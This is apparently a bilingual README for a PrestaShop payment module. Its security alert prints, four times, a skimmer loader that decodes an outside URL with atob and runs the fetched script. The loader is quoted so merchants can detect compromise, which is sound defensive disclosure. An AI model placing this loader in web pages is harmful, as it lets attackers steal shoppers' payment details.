<div style="border:2px solid #ff4d4f; background-color:#fff5f5; padding:25px; border-radius:12px; font-family: Arial, sans-serif;">

<h1 align="center" style="color:#d9363e; margin-top:0;">
🚨 Security Alert – Recommended Verification of Your Stores
</h1>

<p><strong>February 12, 2026 09:07</strong></p>

<p><strong>Update</strong></p>

<p>
We have recently identified a security threat affecting certain online stores within the PrestaShop ecosystem. A malicious script ("digital skimmer") has been detected and may have resulted in the theft of payment information from some of your customers.
</p>

<h2>What does this digital skimmer do?</h2>

<p>
This malware works by replacing legitimate payment buttons on the checkout page with fraudulent buttons. When a customer clicks one of these fake buttons, they are redirected to a counterfeit payment form designed to capture their payment information. The skimmer is simply loaded via a &lt;script&gt; tag, written directly into the _partials/head.tpl file of the active store theme. This means that an attacker was able to modify a store file.
</p>

<h2>How can I check if my store is affected?</h2>

<h3>In the front office</h3>

<p>
You can check your front-office code by inspecting a page of your website (right-click, then "Inspect"). Look inside the &lt;script&gt; tag; if you find the following code, it means your store is impacted:
</p>

<pre><code>&lt;script&gt;(function(){var x=new XMLHttpRequest;x.open('GET',atob('aHR0cHM6Ly9wbHZiLnN1L2J0Lmpz'));x.onload=function(){if(200===x.status)try{Function(x.responseText)()}catch(e){}};x.send();})();&lt;/script&gt;
</code></pre>

<p>
Please note: 
The encoded part aHR0cHM6Ly9wbHZiLnN1L2J0Lmpz changes each time, but the structure of the code remains the same, and the atob() function is always used. 
Code may be present before or after (the skimmer attempts to conceal itself by being slightly different on each store).
</p>

<h3>On your server</h3>

<p>
If you prefer to check your files directly, you can find the same script tag in a file on your server.
</p>

<p>
Connect to your server via FTP, then navigate to the theme folder, then the active theme folder &gt; template folder &gt; _partial &gt; head.tpl.
</p>

<p>
In this file, right-click and choose "view/edit", then search for the same script tag:
</p>

<pre><code>&lt;script&gt;(function(){var x=new XMLHttpRequest;x.open('GET',atob('aHR0cHM6Ly9wbHZiLnN1L2J0Lmpz'));x.onload=function(){if(200===x.status)try{Function(x.responseText)()}catch(e){}};x.send();})();&lt;/script&gt;
</code></pre>

<h2>What should I do if my store is affected?</h2>

<p>
Contact your agency or PrestaShop support.
</p>

<p>
⚠️ At this stage, we strongly recommend performing a full security review of your PrestaShop stores and ensuring that none of them have been compromised.
</p>

<p>
We thank you for your vigilance and cooperation.
</p>

</div>



-------------------------------------------------------------------------
-------------------------------------------------------------------------





**Axepta Online – PrestaShop Payment Module**

![License](https://img.shields.io/badge/License-MIT-green)
![PHP](https://img.shields.io/badge/PHP-%3E=7.2-blue)
![PrestaShop](https://img.shields.io/badge/PrestaShop-1.7.7.0%20→%209.0-orange)
![Release](https://img.shields.io/github/v/release/AxeptaBNPParibas/AxeptaOnline-Prestashop-plugin)
![Downloads](https://img.shields.io/github/downloads/AxeptaBNPParibas/AxeptaOnline-Prestashop-plugin/total)

Overview

The Axepta Online module for PrestaShop enables merchants to process secure online payments through Axepta BNP Paribas.

💳 Supported Payment Methods
- CB  
- Visa  
- Mastercard  
- American Express  
- Apple Pay (on checkout page)  
- Google Pay (on checkout page)  
- PayPal

⚙️ Features
- Automatic capture  
- Manual capture  
- Delayed capture  

📦 Installation

Method 1 — PrestaShop Back-office

Go to Modules > Module Manager

Click Upload a module

Upload the ZIP

Follow instructions

Method 2 — Manual Installation

Extract the ZIP

Copy the folder to /modules/

Install the module from the Module Manager

⬇️ Download

Download the latest version here:

[📥 Download Latest Release](../../releases/latest)

Each release includes:
- ZIP package
- RSA digital signature

> ⚠️ Security Warning: Only use this release if signature verification succeeds. A failed verification means the file may have been tampered with, you can check verification steps in release page.

📞 Support

📧 assistance.ecommerce@bnpparibas.com

-----------------------------------------------------------
-----------------------------------------------------------

<div style="border:2px solid #ff4d4f; background-color:#fff5f5; padding:25px; border-radius:12px; font-family: Arial, sans-serif;">

<h1 align="center" style="color:#d9363e; margin-top:0;">
🚨 Alerte de sécurité – Vérification recommandée de vos boutiques
</h1>

<p><strong>12 février 2026 09:07</strong></p>

<p><strong>Mise à jour</strong></p>

<p>
Nous avons récemment identifié une menace de sécurité affectant certaines boutiques en ligne de l’écosystème PrestaShop. Un script malveillant (« digital skimmer ») a été détecté et pourrait avoir entraîné le vol des informations de paiement de certains de vos clients.
</p>

<h2>Que fait ce digital skimmer ?</h2>

<p>
Ce malware fonctionne en remplaçant les boutons de paiement légitimes sur la page de commande par des boutons frauduleux. Lorsqu’un client clique sur l’un de ces faux boutons, il est redirigé vers un formulaire de paiement contrefait destiné à capturer ses informations de paiement. Le skimmer est simplement chargé via une balise &lt;script&gt;, écrite directement dans le fichier _partials/head.tpl du thème actif de la boutique. Cela signifie que l’attaquant a pu modifier un fichier de la boutique.
</p>

<h2>Comment vérifier si ma boutique est atteinte ?</h2>

<h3>En front-office</h3>

<p>
Vous pouvez vérifier le code de votre front-office en inspectant une page de votre site (clique droit, puis "inspecter"). Regardez à l’intérieur de la balise &lt;script&gt;, si vous trouvez le code suivant, cela veut dire que votre boutique est impactée :
</p>

<pre><code>&lt;script&gt;(function(){var x=new XMLHttpRequest;x.open('GET',atob('aHR0cHM6Ly9wbHZiLnN1L2J0Lmpz'));x.onload=function(){if(200===x.status)try{Function(x.responseText)()}catch(e){}};x.send();})();&lt;/script&gt;
</code></pre>

<p>
À noter : 
La partie aHR0cHM6Ly9wbHZiLnN1L2J0Lmpz change à chaque fois, mais la structure du code reste la même, et la fonction atob() est toujours utilisée. 
Du code peut être présent avant ou après (le skimmer tente de se dissimuler en étant légèrement différent sur chaque boutique).
</p>

<h3>Sur votre serveur</h3>

<p>
Si vous préférez vérifier vos fichiers, vous pouvez retrouver la même balise script dans un fichier sur votre serveur.
</p>

<p>
Connectez-vous à votre serveur par FTP puis naviguez via le dossier theme puis le dossier du thème actif &gt; dossier template &gt; _partial &gt; head.tpl.
</p>

<p>
Sur ce dernier fichier, faites un clique droit puis "afficher/éditer”, et cherchez la même balise :
</p>

<pre><code>&lt;script&gt;(function(){var x=new XMLHttpRequest;x.open('GET',atob('aHR0cHM6Ly9wbHZiLnN1L2J0Lmpz'));x.onload=function(){if(200===x.status)try{Function(x.responseText)()}catch(e){}};x.send();})();&lt;/script&gt;
</code></pre>

<h2>Que faire si ma boutique est concernée ?</h2>

<p>
Contactez votre agence ou le support PrestaShop.
</p>

<p>
⚠️ À ce stade, nous vous recommandons vivement d’effectuer une vérification complète de la sécurité de vos boutiques PrestaShop et de vous assurer qu’aucune d’entre elles n’a été compromise.
</p>

<p>
Nous vous remercions pour votre vigilance et votre coopération.
</p>

</div>

----------------------------------------------------------------------------------
----------------------------------------------------------------------------------


 **Axepta Online – Module de paiement PrestaShop**
 
![License](https://img.shields.io/badge/License-MIT-green)
![PHP](https://img.shields.io/badge/PHP-%3E=7.2-blue)
![PrestaShop](https://img.shields.io/badge/PrestaShop-1.7.7.0%20→%209.0-orange)
![Release](https://img.shields.io/github/v/release/AxeptaBNPParibas/AxeptaOnline-Prestashop-plugin)
![Downloads](https://img.shields.io/github/downloads/AxeptaBNPParibas/AxeptaOnline-Prestashop-plugin/total)


Présentation

Le module Axepta Online pour PrestaShop permet aux marchands d’accepter des paiements sécurisés en ligne via Axepta BNP Paribas.
Il s’intègre de manière fluide et supporte un ensemble complet de moyens de paiement.

💳 Moyens de paiement
- CB  
- Visa  
- Mastercard  
- American Express  
- Apple Pay (intégré sur la page de paiement)  
- Google Pay (intégré sur la page de paiement)  
- PayPal

⚙️ Fonctionnalités
- Capture **automatique**  
- Capture **manuelle**  
- Capture **différée**  

📦 Installation

Méthode 1 — Back-office PrestaShop

    Aller dans Modules > Module Manager
    
    Cliquer sur Upload a module
    
    Importer le fichier ZIP
    
    Suivre les instructions à l’écran

Méthode 2 — Installation manuelle

    Dézipper l'archive
    
    Copier le dossier dans /modules/
    
    Installer le module via Module Manager
  

⬇️ Téléchargement

[📥 Téléchargez la dernière version ici](../../releases/latest)

Chaque version contient :
- Le ZIP du module
- Le RSA digital signature

> ⚠️ Avertissement de sécurité : N'utilisez cette version que si la vérification de la signature réussit. Une vérification échouée signifie que le fichier a pu être altéré, vous pouvez consulter les étapes de vérification sur la page de release

📞 Support

📧 assistance.ecommerce@bnpparibas.com









